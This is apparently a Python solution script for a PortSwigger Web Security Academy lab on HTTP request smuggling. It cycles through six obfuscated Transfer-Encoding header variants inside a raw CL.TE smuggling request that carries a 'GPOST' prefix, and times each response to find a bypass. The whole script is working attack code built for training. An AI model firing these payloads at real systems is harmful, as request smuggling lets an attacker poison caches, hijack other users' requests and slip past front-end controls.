"""
Lab 3: HTTP request smuggling, obfuscating the TE header
https://portswigger.net/web-security/request-smuggling/finding/lab-obfuscating-te-header
Difficulty: Practitioner

📝 The front-end only recognizes a clean `Transfer-Encoding: chunked`
header and falls back to Content-Length if it looks "off" — but the
back-end still honors the mangled version. Cycle through obfuscation
variants until one causes the CL.TE-style timeout.
"""

from utils import send_raw, normalize_crlf, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"

TE_VARIANTS = [
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",          # space before colon
    "Transfer-Encoding: chunked\nTransfer-Encoding: x",
    "Transfer-Encoding:\tchunked",           # tab instead of space
    "Transfer-encoding: chunked",            # lowercase 'e'
    "X: X\nTransfer-Encoding: chunked",
]

BODY_TEMPLATE = """POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
{te_header}

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

"""


def run():
    for variant in TE_VARIANTS:
        payload = normalize_crlf(BODY_TEMPLATE.format(host=HOST, te_header=variant))
        response, elapsed = send_raw(HOST, payload, read_timeout=8)
        log(f"{variant!r:55} -> {elapsed:.2f}s")
        if elapsed > 5:
            log(f"Likely obfuscation bypass found: {variant!r}")
            return

    note("None of the standard variants triggered a delay — try adding more")
    note("casing/whitespace combinations, or a duplicate header with a bad value.")


if __name__ == "__main__":
    run()
